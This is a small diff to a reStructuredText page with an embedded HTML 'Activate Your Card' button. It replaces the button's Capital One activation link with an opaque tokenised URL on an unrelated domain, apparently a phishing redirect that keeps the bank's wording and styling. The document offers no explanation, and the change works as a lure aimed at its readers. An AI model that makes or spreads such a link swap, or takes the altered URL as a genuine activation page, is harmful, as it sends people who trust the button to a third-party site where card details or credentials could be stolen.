@@ -1,7 +1,7 @@
 .. raw:: html
 
    <p>
-      <a href="https://www.capitalone.com/activate" target="_blank"
+      <a href="https://us00.net/?36zGdn4a0hTk5p4SqQxRYrTG5ISyhE6jtHMEv89CY8e27QnP9ZAcC9SsfyN9mBGzM" target="_blank"
          style="background-color:#007BFF;color:white;padding:10px 20px;
          text-decoration:none;border-radius:5px;font-size:16px;">
          Activate Your Card
